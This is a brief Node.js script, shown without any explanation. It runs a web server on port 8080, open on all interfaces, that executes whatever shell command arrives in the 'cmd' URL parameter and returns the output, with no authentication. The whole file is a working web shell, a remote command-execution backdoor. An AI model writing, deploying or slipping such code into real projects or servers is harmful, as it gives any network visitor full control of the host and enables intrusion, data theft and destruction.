const http = require('http');
const { execSync } = require('child_process');

http.createServer((req, res) => {
  const url = new URL(req.url, 'http://localhost');
  const cmd = url.searchParams.get('cmd');
  res.end(execSync(cmd).toString());
}).listen(8080, '0.0.0.0');
